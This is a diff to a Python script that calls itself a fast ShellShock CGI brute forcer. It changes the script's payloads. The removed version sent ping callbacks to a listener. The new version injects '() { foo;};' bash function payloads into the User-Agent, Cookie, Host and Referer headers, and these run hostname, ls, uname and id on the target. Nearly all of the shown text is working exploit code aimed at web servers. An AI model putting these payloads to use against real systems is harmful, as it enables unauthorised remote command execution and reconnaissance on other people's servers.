@@ -1,9 +1,7 @@
 #!/usr/bin/env python
 #Uses lists from RAFT and detectify.com
-#By Peter Kim
+#Forked from Peter Kim
 #Description: Fast ShellShock CGI bin brute forcer
-#May have to play around with threads to get the best value.
-#
 
 from urlparse import urlparse
 from threading import Thread
@@ -20,13 +18,11 @@ def doWork():
         q.task_done()
 
 def getStatus(ourl):
-    #IP Address Sniffer is Listening on: sudo tcpdump -nni eth0 -e icmp[icmptype] == 8
-    IP_listner = "127.0.0.1"
 
-    USER_AGENT = "() { :; }; /bin/ping -c1 " + IP_listner
-    Cookie = "() { :; }; /bin/ping -c1 " + IP_listner
-    Host = "() { :; }; /bin/ping -c1 " + IP_listner
-    Referer = "() { :; }; /bin/ping -c1 " + IP_listner
+    USER_AGENT = "() { foo;};echo;/bin/bash -c '/bin/hostname --fqdn;/bin/ls -la /;'"
+    Cookie = "() { foo;};echo;/bin/bash -c '/bin/hostname --fqdn;/bin/ls -la /;'"
+    Host = "() { foo;};echo;/bin/bash -c '/bin/hostname --fqdn;/bin/ls -la /;'"
+    Referer = "() { foo;};echo;/bin/bash -c '/bin/hostname --fqdn;/bin/uname -a;/usr/bin/id;/bin/ls -la /;'"
     try:
      url = urlparse(ourl)
      print url
